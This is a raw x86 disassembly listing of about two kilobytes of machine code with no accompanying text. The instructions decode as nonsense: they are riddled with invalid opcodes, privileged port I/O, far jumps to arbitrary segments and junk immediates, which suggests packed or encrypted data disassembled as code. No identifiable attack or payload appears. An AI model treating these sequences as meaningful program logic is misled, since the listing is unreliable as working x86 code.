  412196:	and    edx,DWORD PTR ds:0x2d73eff8
  41219c:	mov    eax,0x37719502
  4121a1:	jae    0x4121a1
  4121a3:	xlat   BYTE PTR ds:[ebx]
  4121a4:	aaa    
  4121a5:	jmp    0x52ba69cb
  4121aa:	pop    es
  4121ab:	jbe    0x41216e
  4121ad:	mov    ecx,0x2bf511a2
  4121b2:	pop    esi
  4121b3:	pop    ds
  4121b4:	lea    ebx,ds:0x714390a
  4121ba:	mov    WORD PTR [edi+edx*4],ds
  4121bd:	cmp    eax,0x64739425
  4121c2:	cmc    
  4121c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121c4:	retf   
  4121c5:	mov    eax,ds:0x7565fb6
  4121ca:	pop    edx
  4121cb:	jmp    0xa8e5:0x681350c3
  4121d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121d3:	mov    esp,0xf8556f2f
  4121d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121d9:	leave  
  4121da:	pop    eax
  4121db:	fistp  WORD PTR [edi+0x77f6ac0b]
  4121e1:	or     BYTE PTR [esi-0x1d6c9dda],dh
  4121e7:	mov    ebx,0x5ad8f671
  4121ec:	jne    0x412237
  4121ee:	sub    ebx,DWORD PTR [ecx]
  4121f0:	cmp    esp,DWORD PTR es:[edx-0x2e]
  4121f4:	and    al,0xc0
  4121f6:	mov    ds:0x237d499a,eax
  4121fb:	mov    ?,ecx
  4121fd:	push   ds
  4121fe:	ficomp WORD PTR [edi+0x5e3441ab]
  412204:	(bad)  
  412205:	cli    
  412206:	jo     0x4121de
  412208:	pop    ecx
  412209:	cld    
  41220a:	fdivr  DWORD PTR [edx-0x3d]
  41220d:	outs   dx,DWORD PTR ds:[esi]
  41220e:	mov    al,0x4e
  412210:	mov    ebp,0x205af7de
  412215:	jl     0x412247
  412217:	pop    ds
  412218:	ret    0xcbb4
  41221b:	dec    ecx
  41221c:	pop    DWORD PTR [edx-0x77f56c03]
  412222:	xchg   DWORD PTR [eax-0x51fbd499],ecx
  412228:	pop    edx
  412229:	push   es
  41222a:	jae    0x412289
  41222c:	mov    esi,db2
  41222f:	jle    0x412246
  412231:	add    bh,BYTE PTR ds:0xed001c1a
  412237:	fld    TBYTE PTR [ebp+0xc]
  41223a:	adc    ah,bh
  41223c:	adc    al,0xde
  41223e:	iret   
  41223f:	jle    0x412256
  412241:	repz sbb BYTE PTR ds:0xbbe95d1f,0xe6
  412249:	or     eax,0xa4afa620
  41224e:	or     eax,0xbd16d5a1
  412253:	out    dx,al
  412254:	jno    0x412261
  412256:	cmp    al,0x42
  412258:	push   ebp
  412259:	arpl   WORD PTR cs:[esi],bx
  41225c:	and    al,0x8f
  41225e:	into   
  41225f:	mov    edx,0xf96992fc
  412264:	push   ebx
  412265:	pop    esp
  412266:	nop
  412267:	rcr    ebp,0xcd
  41226a:	into   
  41226b:	test   bh,0x54
  41226e:	ins    BYTE PTR es:[edi],dx
  41226f:	push   edx
  412270:	and    ebp,edx
  412272:	repz inc ebp
  412274:	sbb    bh,BYTE PTR [ebx]
  412276:	aam    0x5b
  412278:	cmp    ecx,DWORD PTR [ebx+ecx*4]
  41227b:	nop
  41227c:	cmp    eax,0xb1bbd500
  412281:	mov    ebx,DWORD PTR [edi-0x6d]
  412284:	mov    eax,ds:0x85a5664e
  412289:	xlat   BYTE PTR ds:[ebx]
  41228a:	pushf  
  41228b:	out    dx,al
  41228c:	aas    
  41228d:	mov    edi,0x9e0ccffd
  412292:	nop
  412293:	lods   al,BYTE PTR ds:[esi]
  412294:	adc    bh,BYTE PTR [esi]
  412296:	aas    
  412297:	cmp    eax,0x89e410cd
  41229c:	jg     0x4122f3
  41229e:	mov    al,0xff
  4122a0:	popf   
  4122a1:	out    0xff,al
  4122a3:	retf   
  4122a4:	add    eax,0x5b9bf11
  4122a9:	inc    ebp
  4122aa:	jl     0x412263
  4122ac:	retf   
  4122ad:	and    BYTE PTR [edx-0x13157eab],bh
  4122b3:	retf   
  4122b4:	mov    cl,0x2b
  4122b6:	imul   ebp,DWORD PTR [edi-0x25ed6492],0x1c83c951
  4122c0:	dec    esp
  4122c1:	push   edx
  4122c2:	sbb    dl,ch
  4122c4:	jmp    0x412306
  4122c6:	into   
  4122c7:	rcpps  xmm3,xmm2
  4122ca:	ss mov bl,0x99
  4122cd:	sbb    ebx,DWORD PTR [edi+0x58e9afb3]
  4122d3:	add    BYTE PTR [edx-0x724f87f4],ah
  4122d9:	add    al,0xe9
  4122db:	inc    esi
  4122dc:	fxtract 
  4122de:	and    ecx,edi
  4122e0:	push   ss
  4122e1:	cmp    DWORD PTR [eax-0x19],ebx
  4122e4:	inc    ebx
  4122e5:	mov    bl,0xb3
  4122e7:	scas   al,BYTE PTR es:[edi]
  4122e8:	test   ebx,0x8ca6349c
  4122ee:	xchg   ebx,eax
  4122ef:	or     ebp,eax
  4122f1:	(bad)  
  4122f2:	scas   al,BYTE PTR es:[edi]
  4122f3:	xor    edi,DWORD PTR ds:0x898b2135
  4122f9:	mov    ebx,0x4f9f5f3a
  4122fe:	sbb    DWORD PTR [esi-0x6c54799a],edi
  412304:	call   0x9dd29dda
  412309:	ja     0x4122c1
  41230b:	mov    esi,0x72e88d44
  412310:	add    DWORD PTR [edi-0x4c8b43b1],0x989c3201
  41231a:	and    eax,0x4981128b
  41231f:	pop    eax
  412320:	push   esi
  412321:	xor    edx,ecx
  412323:	or     DWORD PTR [ebx],0xffffffdb
  412326:	sub    ah,ch
  412328:	out    dx,eax
  412329:	addr16 mov al,0xfb
  41232c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41232d:	cld    
  41232e:	push   ebx
  41232f:	jbe    0x412351
  412331:	mov    ah,0x10
  412333:	test   BYTE PTR [edx+eiz*8-0x13e10505],al
  41233a:	(bad)  
  41233b:	jmp    0x4123a3
  41233d:	mov    ebp,0x583559ca
  412342:	les    edx,FWORD PTR [edi-0x19]
  412345:	(bad)  
  412346:	jl     0x412324
  412348:	(bad)  
  412349:	sahf   
  41234a:	inc    eax
  41234b:	dec    eax
  41234c:	cmp    edi,DWORD PTR [edx+0x44]
  41234f:	mov    ds:0x3b5cc83b,eax
  412354:	jl     0x412331
  412356:	icebp  
  412357:	test   eax,0x64af7d65
  41235c:	pop    ebp
  41235d:	mov    ch,0xbd
  41235f:	lods   eax,DWORD PTR ds:[esi]
  412360:	lods   eax,DWORD PTR ds:[esi]
  412361:	cmp    bh,BYTE PTR [esi-0x14d93efe]
  412367:	repz jmp 0x8311:0x60cd64f0
  41236f:	shl    DWORD PTR es:[ecx-0x11],cl
  412373:	fs pop esi
  412375:	(bad)  
  412376:	aam    0xa1
  412378:	cmp    edx,esi
  41237a:	sbb    al,al
  41237c:	aad    0x2a
  41237e:	xchg   esp,eax
  41237f:	mov    edx,0x9f22382
  412384:	ss jne 0x412396
  412387:	pop    eax
  412388:	pop    edi
  412389:	adc    eax,0x29ad19c7
  41238e:	loope  0x4123e8
  412390:	sub    al,BYTE PTR [ebp-0x1b]
  412393:	and    al,0xd0
  412395:	sbb    DWORD PTR [edx],eax
  412397:	push   0x91e238cb
  41239c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41239d:	popa   
  41239e:	and    ebp,ecx
  4123a0:	pop    edi
  4123a1:	mov    ah,0x3d
  4123a3:	sbb    al,0xf0
  4123a5:	mov    cl,0x1d
  4123a7:	sub    eax,0x503bb0f6
  4123ac:	push   0x2c5ed795
  4123b1:	les    esi,FWORD PTR [ebx-0x28]
  4123b4:	cdq    
  4123b5:	nop
  4123b6:	xor    eax,0x6bc894d
  4123bb:	repz xchg edx,eax
  4123bd:	cmp    ch,ch
  4123bf:	sahf   
  4123c0:	jb     0x412386
  4123c2:	aam    0x4f
  4123c4:	nop
  4123c5:	pop    ebx
  4123c6:	addr16 fdecstp 
  4123c9:	pop    eax
  4123ca:	cwde   
  4123cb:	jle    0x41244a
  4123cd:	inc    edi
  4123ce:	mov    edx,0x36e8d74a
  4123d3:	loopne 0x412379
  4123d5:	pop    es
  4123d6:	stos   BYTE PTR es:[edi],al
  4123d7:	lods   eax,DWORD PTR ds:[esi]
  4123d8:	dec    esi
  4123d9:	inc    eax
  4123da:	mov    al,0xd1
  4123dc:	les    esi,FWORD PTR [eax-0x37437ef5]
  4123e2:	js     0x412431
  4123e4:	and    al,BYTE PTR [esi]
  4123e6:	xlat   BYTE PTR ds:[ebx]
  4123e7:	pop    ecx
  4123e8:	cmp    eax,0x7cc5cd0f
  4123ed:	fst    QWORD PTR [edi-0x3f]
  4123f0:	stos   BYTE PTR es:[edi],al
  4123f1:	push   ebx
  4123f2:	inc    esp
  4123f3:	popa   
  4123f4:	mov    al,0x84
  4123f6:	imul   ecx,DWORD PTR [edx-0x47],0xffffffd1
  4123fa:	dec    BYTE PTR [eax+0x41]
  4123fd:	pop    eax
  4123fe:	push   edx
  4123ff:	(bad)  
  412400:	mov    ch,0x89
  412402:	jp     0x41240a
  412404:	(bad)  
  412405:	iret   
  412406:	call   0xef232ee8
  41240b:	mov    esp,0x84829098
  412410:	ds mov esp,0x493ffd38
  412416:	dec    ebx
  412417:	pextrw edx,mm2,0x16
  41241b:	push   eax
  41241c:	(bad)  
  41241e:	out    dx,eax
  41241f:	sub    eax,0xadd07ac
  412424:	inc    ecx
  412425:	xor    eax,DWORD PTR [ebx+0x52]
  412428:	cmp    DWORD PTR [ebx+0x5c37e523],ecx
  41242e:	daa    
  41242f:	push   eax
  412430:	hlt    
  412431:	ins    BYTE PTR es:[edi],dx
  412432:	mov    ebp,0xfa566622
  412437:	or     BYTE PTR [eax],cl
  412439:	scas   eax,DWORD PTR es:[edi]
  41243a:	sahf   
  41243b:	daa    
  41243c:	and    BYTE PTR [edi-0x3a4901f7],bh
  412442:	adc    bh,ah
  412444:	xor    esi,edi
  412446:	jno    0x4123cd
  412448:	test   al,0x7
  41244a:	jg     0x4124c6
  41244c:	setg   al
  41244f:	xchg   ecx,eax
  412450:	clc    
  412451:	jecxz  0x4124a2
  412453:	sbb    eax,0x2c4b569
  412458:	mov    ds:0xe2797fb4,al
  41245d:	leave  
  41245e:	pop    esp
  41245f:	lods   al,BYTE PTR ds:[esi]
  412460:	aad    0x97
  412462:	xchg   ecx,eax
  412463:	rol    BYTE PTR [edx+edx*4-0x346a9596],1
  41246a:	inc    esi
  41246b:	xchg   ebp,eax
  41246c:	add    esi,esi
  41246e:	aam    0x7
  412470:	pop    ds
  412471:	fstp   QWORD PTR [edi]
  412473:	aas    
  412474:	inc    esp
  412475:	in     eax,0xaf
  412477:	mov    eax,ds:0x34fb2bd
  41247c:	xchg   ah,dh
  41247e:	repz fisttp DWORD PTR [ebp+0x3b]
  412482:	dec    esp
  412483:	loope  0x412481
  412485:	xor    eax,0xd30fbdc3
  41248a:	jns    0x41244d
  41248c:	retf   0xbb78
  41248f:	or     bl,ah
  412491:	push   0xb036a4ea
  412496:	out    0x7,eax
  412498:	rol    BYTE PTR [ecx],1
  41249a:	into   
  41249b:	jnp    0x4c82f65c
  4124a1:	xchg   edx,eax
  4124a2:	fld    DWORD PTR [ecx-0x13]
  4124a5:	jnp    0x412465
  4124a7:	sbb    dh,0x12
  4124aa:	mov    esp,0x6a8df79a
  4124af:	ins    BYTE PTR es:[edi],dx
  4124b0:	xchg   edx,eax
  4124b1:	cmp    bh,BYTE PTR gs:[ebp+edi*1-0x26]
  4124b6:	cmp    al,0xc6
  4124b8:	pop    ss
  4124b9:	fist   WORD PTR [ecx+0xb850466]
  4124bf:	mov    bl,0xcf
  4124c1:	or     DWORD PTR [esi-0x5779ebc0],eax
  4124c7:	or     dl,bh
  4124c9:	shr    BYTE PTR [esi],1
  4124cb:	mov    esi,0x321676a2
  4124d0:	bound  esp,QWORD PTR [edx-0x15f95449]
  4124d6:	jecxz  0x412467
  4124d8:	fucomp st(7)
  4124da:	mov    ebp,0x8ab211dd
  4124df:	aam    0x65
  4124e1:	mov    ch,0x9b
  4124e3:	inc    ebx
  4124e4:	pop    eax
  4124e5:	rol    DWORD PTR [edx+edx*2],cl
  4124e8:	icebp  
  4124e9:	mov    esp,0xc14b4de
  4124ee:	mov    dl,0x28
  4124f0:	fisttp WORD PTR [edx-0x70604f18]
  4124f6:	xchg   ebp,eax
  4124f7:	vunpcklps ymm7,ymm4,YMMWORD PTR [ecx+0x50]
  4124fc:	ret    0xda
  4124ff:	sahf   
  412500:	inc    esi
  412501:	enter  0xca45,0x12
  412505:	xchg   BYTE PTR [edx+esi*1-0x475653d5],cl
  41250c:	add    ah,BYTE PTR es:[ebp+0x764a43e]
  412513:	retf   0x412f
  412516:	das    
  412517:	sbb    esp,DWORD PTR [eax-0x18adc4d8]
  41251d:	xchg   esi,eax
  41251e:	sub    edi,DWORD PTR [edi-0x1790b929]
  412524:	mov    ebx,0x89c694e
  412529:	mov    eax,fs:0x2732a95a
  41252f:	and    al,BYTE PTR [edx+0x2]
  412532:	and    eax,0xb2091881
  412537:	mov    ecx,0x41a961a8
  41253c:	mov    ebp,0x61c72df1
  412541:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  412543:	add    al,0xbb
  412545:	pop    ebx
  412546:	cwde   
  412547:	sbb    BYTE PTR [ebx-0x7e511e9d],0xe8
  41254e:	mov    al,0x59
  412550:	adc    edx,edx
  412552:	in     al,0x42
  412554:	sbb    DWORD PTR [eax+0x43dc0d9b],edx
  41255a:	adc    al,0x69
  41255c:	xchg   ebx,eax
  41255d:	jbe    0x41251f
  41255f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412560:	sbb    DWORD PTR [ebp+0x2e11a2ec],0x44abbff9
  41256a:	and    eax,0x5df973f8
  41256f:	loope  0x4125bc
  412571:	lahf   
  412572:	addr16 mov ebx,0x104d9ad6
  412578:	into   
  412579:	fwait
  41257a:	mov    al,al
  41257c:	xor    al,0xee
  41257e:	sub    DWORD PTR ds:[ecx+0x1664826f],edx
  412585:	aas    
  412586:	sti    
  412587:	xchg   esi,eax
  412588:	es mov ebp,0x341dd8d9
  41258e:	mov    bh,0x4b
  412590:	add    ebp,ebx
  412592:	jle    0x41255a
  412594:	fistp  WORD PTR [edx+0x14]
  412597:	adc    ebx,esi
  412599:	div    DWORD PTR [ecx]
  41259b:	shl    BYTE PTR [esi],cl
  41259d:	(bad)  
  41259e:	adc    ebp,DWORD PTR [edi-0x35168eda]
  4125a4:	aam    0x9a
  4125a6:	call   0xdf03:0x78af1704
  4125ad:	xor    bh,BYTE PTR [edx-0x36a9275a]
  4125b3:	pop    ecx
  4125b4:	lods   al,BYTE PTR ds:[esi]
  4125b5:	out    0xd,al
  4125b7:	(bad)  
  4125b8:	test   BYTE PTR [esi+0x41c17019],bl
  4125be:	mov    WORD PTR [esi-0xd0fe0a4],?
  4125c4:	test   DWORD PTR [eax],edi
  4125c6:	out    0x88,al
  4125c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125c9:	sub    al,0xd5
  4125cb:	dec    edi
  4125cc:	pop    esi
  4125cd:	(bad)  
  4125ce:	in     eax,dx
  4125cf:	aaa    
  4125d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125d1:	lds    edx,FWORD PTR [ebx]
  4125d3:	or     esp,ebx
  4125d5:	jge    0x41255d
  4125d7:	mov    ebx,0xb8761279
  4125dc:	jbe    0x41259d
  4125de:	xchg   esi,eax
  4125df:	fnstcw WORD PTR [ebp-0x26]
  4125e2:	test   eax,0x526886a5
  4125e7:	push   ecx
  4125e8:	int3   
  4125e9:	int3   
  4125ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125eb:	repnz cwde 
  4125ed:	mov    ch,BYTE PTR [edx+0x7c]
  4125f0:	dec    edx
  4125f1:	push   edi
  4125f2:	dec    eax
  4125f3:	retf   0x363f
  4125f6:	loope  0x4125b6
  4125f8:	js     0x412588
  4125fa:	jbe    0x4125c7
  4125fc:	stc    
  4125fd:	mov    esi,0x714922cf
  412602:	adc    DWORD PTR [edx],ebx
  412604:	xor    bh,BYTE PTR [ebx]
  412606:	push   edi
  412607:	cmc    
  412608:	jg     0x412679
  41260a:	scas   eax,DWORD PTR es:[edi]
  41260b:	push   ebp
  41260c:	jo     0x412641
  41260e:	jmp    0xf07d63ca
  412613:	dec    esi
  412614:	int    0x5d
  412616:	jp     0x412634
  412618:	cmc    
  412619:	pop    ds
  41261a:	aas    
  41261b:	sbb    BYTE PTR [ebp+0x3a],bl
  41261e:	jmp    0xc6cb:0xb4658576
  412625:	vxorps ymm0,ymm3,YMMWORD PTR [ebx+0x13]
  41262a:	jecxz  0x412697
  41262c:	ficom  WORD PTR es:[esi+0x313a1733]
  412633:	pop    es
  412634:	scas   eax,DWORD PTR es:[edi]
  412635:	int    0x7c
  412637:	fadd   DWORD PTR [edi]
  412639:	inc    eax
  41263a:	mov    cl,0xd2
  41263c:	push   ss
  41263d:	push   eax
  41263e:	mov    al,0x2a
  412640:	or     ch,BYTE PTR [eax]
  412642:	jle    0x4125cd
  412644:	data16 jno 0x412639
  412647:	inc    edx
  412648:	dec    eax
  412649:	add    DWORD PTR [ecx-0x7304b3b4],edi
  41264f:	mov    ch,0xa5
  412651:	rcr    eax,1
  412653:	inc    ebx
  412654:	fisttp DWORD PTR ds:0x2d63dff3
  41265a:	rcl    edx,0xce
  41265d:	push   0xfffffffb
  41265f:	ret    
  412660:	stos   BYTE PTR es:[edi],al
  412661:	mov    edi,0x9fa42c23
  412666:	dec    eax
  412667:	sbb    eax,0xf7353bf4
  41266c:	mov    ecx,0x24b8f686
  412671:	ins    BYTE PTR es:[edi],dx
  412672:	js     0x412654
  412674:	pop    ds
  412675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412676:	pop    eax
  412677:	arpl   WORD PTR [ecx-0x5610e80d],dx
  41267d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41267e:	into   
  41267f:	(bad)  
  412680:	fild   QWORD PTR [eax]
  412682:	push   esi
  412683:	into   
  412684:	shl    BYTE PTR [ebx],1
  412686:	mov    eax,0x3c38ab4c
  41268b:	test   al,0x49
  41268d:	inc    eax
  41268e:	jmp    0xa2d3:0x8deb5ca8
  412695:	or     ah,dl
  412697:	cld    
  412698:	sbb    dl,BYTE PTR [esi+0x5b]
  41269b:	sbb    ebx,DWORD PTR [ebp-0xe7a16bd]
  4126a1:	and    esp,ecx
  4126a3:	cmc    
  4126a4:	mov    eax,ds:0x4da98051
  4126a9:	mov    ecx,0x58d63ed
  4126ae:	(bad)  
  4126af:	mov    edi,0x5717668f
  4126b4:	inc    ebx
  4126b5:	(bad)  
  4126b6:	aad    0x5d
  4126b8:	push   esp
  4126b9:	test   al,0x76
  4126bb:	int    0x88
  4126bd:	xor    BYTE PTR [esi-0x12],ch
  4126c0:	fbstp  TBYTE PTR [edi+0x6b]
  4126c3:	mov    dl,0xb6
  4126c5:	stc    
  4126c6:	or     BYTE PTR [ecx+0x38],ch
  4126c9:	in     al,0xef
  4126cb:	icebp  
  4126cc:	repnz mov al,0x50
  4126cf:	jb     0x4126ba
  4126d1:	inc    ecx
  4126d2:	lahf   
  4126d3:	inc    edx
  4126d4:	jmp    0xcb45:0x5df9527b
  4126db:	cs inc edi
  4126dd:	fsub   QWORD PTR [eax-0x1c209ad6]
  4126e3:	mov    ds:0xc7a25819,eax
  4126e8:	xor    DWORD PTR [ebx],edi
  4126ea:	mov    dh,0xe7
  4126ec:	jne    0x4126c8
  4126ee:	push   esp
  4126ef:	retf   0xe2e0
  4126f2:	xchg   esp,eax
  4126f3:	loope  0x412746
  4126f5:	sub    edi,DWORD PTR [ecx+edx*4+0x72ecbbea]
  4126fc:	mov    cl,0x80
  4126fe:	arpl   WORD PTR [edx+0x9],cx
  412701:	data16 out dx,al
  412703:	gs sbb cl,ch
  412706:	xor    BYTE PTR [eax-0x64],bh
  412709:	push   0x77
  41270b:	loopne 0x412711
  41270d:	test   DWORD PTR [edi-0x6d],ebx
  412710:	jl     0x41274f
  412712:	mov    dh,0x8e
  412714:	ficom  WORD PTR [eax]
  412716:	jge    0x41276c
  412718:	pop    ebp
  412719:	add    al,0x44
  41271b:	repnz dec esp
  41271d:	das    
  41271e:	mov    ds:0x36326162,al
  412723:	popf   
  412724:	xor    ah,cl
  412726:	jle    0x4126c3
  412728:	data16 loope 0x41276b
  41272b:	int3   
  41272c:	repnz cmp al,0x9a
  41272f:	and    eax,DWORD PTR ds:0x82fcff03
  412735:	out    dx,al
  412736:	xor    edx,DWORD PTR [ebx-0x7bacc472]
  41273c:	adc    al,0x76
  41273e:	xor    cl,ch
  412740:	fs out 0x3e,eax
  412743:	in     eax,0x84
  412745:	jl     0x412770
  412747:	adc    dl,dh
  412749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41274a:	xchg   esp,eax
  41274b:	mov    bh,0xe5
  41274d:	mov    ah,0x51
  41274f:	dec    eax
  412750:	inc    ecx
  412751:	enter  0xdec2,0x61
  412755:	into   
  412756:	outs   dx,DWORD PTR ds:[esi]
  412757:	std    
  412758:	push   esi
  412759:	(bad)  
  41275a:	in     al,dx
  41275b:	test   ebx,0xd216d573
  412761:	add    esp,edx
  412763:	inc    ebp
  412764:	nop
  412765:	ins    DWORD PTR es:[edi],dx
  412766:	es ins BYTE PTR es:[edi],dx
  412768:	les    edx,FWORD PTR [esi-0x7e9517a4]
  41276e:	daa    
  41276f:	aas    
  412770:	ins    DWORD PTR es:[edi],dx
  412771:	fdiv   DWORD PTR [ecx]
  412773:	push   esp
  412774:	pop    es
  412775:	into   
  412776:	jge    0x412738
  412778:	xchg   edx,eax
  412779:	mov    al,ds:0x6628989a
  41277e:	je     0x41272c
  412780:	pop    es
  412781:	mov    ebx,0xf9074ebd
  412786:	lahf   
  412787:	jno    0x412797
  412789:	push   ds
  41278a:	dec    esi
  41278b:	test   BYTE PTR [ebx-0x36db949b],ah
  412791:	mov    eax,0x12a1b7d0
  412796:	sbb    eax,0x5579da67
  41279b:	fidiv  DWORD PTR [eax+0x35d5c84c]
  4127a1:	ja     0x412730
  4127a3:	enter  0x52bc,0x4a
  4127a7:	xor    eax,0xdfbee7c2
  4127ac:	and    eax,0xd897a023
  4127b1:	sbb    eax,0x3ab531d1
  4127b6:	retf   0xe014
  4127b9:	sbb    ecx,edx
  4127bb:	pop    eax
  4127bc:	cs call 0x632d9378
  4127c2:	repz or ch,BYTE PTR [ebx]
  4127c5:	pop    edx
  4127c6:	xchg   ecx,eax
  4127c7:	pop    es
  4127c8:	lods   al,BYTE PTR ss:[esi]
  4127ca:	cld    
  4127cb:	cdq    
  4127cc:	out    dx,al
  4127cd:	xchg   ebp,eax
  4127ce:	mov    DWORD PTR [esi-0x4c],0x3b360097
  4127d5:	bswap  eax
  4127d7:	sub    eax,0x1b9e3b85
  4127dc:	inc    ecx
  4127dd:	std    
  4127de:	dec    eax
  4127df:	popf   
  4127e0:	or     ah,BYTE PTR [edi-0x4f9a93de]
  4127e6:	inc    ebp
  4127e7:	test   al,dh
  4127e9:	fwait
  4127ea:	test   al,0x11
  4127ec:	lahf   
  4127ed:	or     al,0xd7
  4127ef:	mov    cl,0x2
  4127f1:	push   eax
  4127f2:	inc    esi
  4127f3:	push   esi
  4127f4:	pop    es
  4127f5:	daa    
  4127f6:	xor    al,0x27
  4127f8:	std    
  4127f9:	xchg   esp,eax
  4127fa:	shr    DWORD PTR ds:[ebx+0x1a],cl
  4127fe:	stos   DWORD PTR es:[edi],eax
  4127ff:	inc    edx
  412800:	ja     0x412841
  412802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412803:	cli    
  412804:	dec    esi
  412805:	fcom   DWORD PTR [ecx+0x2ed4f4d1]
  41280b:	rcr    DWORD PTR [esi+0x23],0x1d
  41280f:	adc    DWORD PTR [edi-0x56aeb8b0],esi
  412815:	je     0x412823
  412817:	and    BYTE PTR [esi+ebx*1-0x19e4b948],dh
  41281e:	mov    ch,0x92
  412820:	(bad)  
  412822:	mov    BYTE PTR [ecx],cl
  412824:	xchg   edx,eax
  412825:	xor    ecx,esi
  412827:	in     eax,0xb3
  412829:	retf   0x4228
  41282c:	dec    eax
  41282d:	mov    dh,BYTE PTR [edi+0x62f7f11d]
  412833:	sub    eax,DWORD PTR [esi+0x6c300705]
  412839:	xchg   edi,eax
  41283a:	xchg   ecx,eax
  41283b:	call   0x8e85:0xe0af314f
  412842:	xor    eax,0xf98be75d
  412847:	enter  0x1ac,0xbc
  41284b:	jnp    0x4128a9
  41284d:	dec    esi
  41284e:	xchg   edx,eax
  41284f:	stc    
  412850:	and    al,BYTE PTR [ebp+0x42]
  412853:	rcr    DWORD PTR [ecx+ebx*4],cl
  412856:	cmp    BYTE PTR [ebx-0x2e2a190b],cl
  41285c:	mov    ebp,0x4c33d322
  412861:	icebp  
  412862:	mov    dl,0xb2
  412864:	xchg   edx,eax
  412865:	les    edx,FWORD PTR [ecx]
  412867:	dec    ebx
  412868:	mov    ch,dh
  41286a:	hlt    
  41286b:	and    al,0xdd
  41286d:	dec    eax
  41286e:	into   
  41286f:	stos   DWORD PTR es:[edi],eax
  412870:	pop    ebp
  412871:	sbb    DWORD PTR ds:0xd34c1751,ebx
  412877:	popa   
  412878:	mov    al,0x80
  41287a:	xchg   ebx,eax
  41287b:	push   ds
  41287c:	cs inc edi
  41287e:	aaa    
  41287f:	adc    BYTE PTR [edx],bh
  412881:	imul   esp,DWORD PTR [ebx+0x40],0xffffffd8
  412885:	mov    eax,ds:0x882aa793
  41288a:	add    DWORD PTR [eax],eax
  41288c:	mov    ch,0x69
  41288e:	cmp    BYTE PTR [edi-0x1efc1da],0xa
  412895:	faddp  st(6),st
  412897:	push   esi
  412898:	xchg   BYTE PTR [ebx-0x29],dh
  41289b:	jb     0x4128f2
  41289d:	xor    BYTE PTR [esi-0x752c81e5],cl
  4128a3:	jp     0x412859
  4128a5:	ficom  DWORD PTR [esi+0x50]
  4128a8:	add    DWORD PTR [ebx-0x7dc6cc42],0xb1a12a03
  4128b2:	iret   
  4128b3:	sub    ecx,DWORD PTR [edx]
  4128b5:	and    al,0x57
  4128b7:	jo     0x4128ee
  4128b9:	adc    ebx,0xbb74ecb4
  4128bf:	cmc    
  4128c0:	jnp    0x4128e5
  4128c2:	shl    BYTE PTR [ecx+0xd],1
  4128c5:	les    ebp,FWORD PTR [edx+0x76]
  4128c8:	(bad)  
  4128c9:	xchg   esi,eax
  4128ca:	and    ebx,DWORD PTR [ecx]
  4128cc:	mov    ds:0x27f86145,eax
  4128d1:	lods   al,BYTE PTR ds:[esi]
  4128d2:	dec    ebp
  4128d3:	fnstsw WORD PTR [edx+esi*8-0x48]
  4128d7:	mov    al,ds:0x6ca59843
  4128dc:	adc    DWORD PTR [eax],ebx
  4128de:	ret    
  4128df:	mov    al,0x81
  4128e1:	icebp  
  4128e2:	cmp    al,0x92
  4128e4:	mov    dh,0x9
  4128e6:	cdq    
  4128e7:	outs   dx,DWORD PTR ds:[esi]
  4128e8:	dec    edi
  4128e9:	jl     0x412947
  4128eb:	cmp    eax,0x3277de44
  4128f0:	mov    ch,0x57
  4128f2:	lahf   
  4128f3:	jne    0x41294b
  4128f5:	add    esp,esi
  4128f7:	inc    ecx
  4128f8:	shl    ah,1
  4128fa:	pop    eax
  4128fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128fc:	imul   ecx,DWORD PTR [ebx-0x18],0x7154f226
  412903:	and    DWORD PTR [edi+eiz*1],0xb
  412907:	frstor [esi-0x589df6bb]
  41290d:	ja     0x4128b1
  41290f:	xchg   edx,eax
  412910:	std    
  412911:	sbb    dl,BYTE PTR [edi-0x30]
  412914:	and    BYTE PTR [ebx+0x50],cl
  412917:	push   es
  412918:	pop    ebp
  412919:	sub    BYTE PTR [edi-0x6af318f6],dh
  41291f:	xor    eax,0xe61b5be6
  412924:	push   edx
  412925:	sub    ah,bh
  412927:	mov    WORD PTR [edi],ss
  412929:	test   DWORD PTR [edi-0x31e38aa7],eax
  41292f:	loop   0x41296d
  412931:	jno    0x4128c6
  412933:	adc    eax,0xd05c8f6a
  412938:	rcr    BYTE PTR [ebx+0x6],cl
  41293b:	rol    BYTE PTR [ebp-0x5069da3a],cl
  412941:	inc    ebp
  412942:	je     0x41295b
  412944:	mov    DWORD PTR [ecx-0x7c73b9b7],edi
  41294a:	rol    dh,1
  41294c:	add    BYTE PTR [ecx-0x42],cl
  41294f:	jbe    0x41295c
  412951:	xchg   esp,eax
  412952:	stos   DWORD PTR es:[edi],eax
  412953:	or     DWORD PTR [ebx],ebp
  412955:	fist   DWORD PTR [edi-0x20]
  412958:	addr16 and ch,dl
  41295b:	add    BYTE PTR cs:[ebx+0x4b],0x62
  412960:	int3   
  412961:	mov    al,ds:0xdeb178c1
  412966:	jns    0x412990
  412968:	in     al,dx
  412969:	rcl    BYTE PTR [edi+0x45],1
  41296c:	pop    ss
  41296d:	fwait
  41296e:	push   0x19e2040e
  412973:	retf   0x9a51
  412976:	sar    dl,1
  412978:	mov    al,ds:0x400842ff
  41297d:	sti    
  41297e:	loop   0x4129c8
  412980:	lds    edx,FWORD PTR ds:0x7d34a36e
  412986:	jg     0x412945
  412988:	(bad)  
  41298a:	shl    DWORD PTR [esi+0x44],0xc7
  41298e:	ret    0x4ac0
  412991:	pop    ss
  412992:	jle    0x412950
  412994:	into   
  412995:	call   0xc7e7f813
  41299a:	xchg   ecx,eax
  41299b:	daa    
  41299c:	push   edx
  41299d:	pop    ss
  41299e:	popf   
  41299f:	in     eax,dx
  4129a0:	in     eax,0x3e
  4129a2:	xlat   BYTE PTR ds:[ebx]
  4129a3:	push   eax
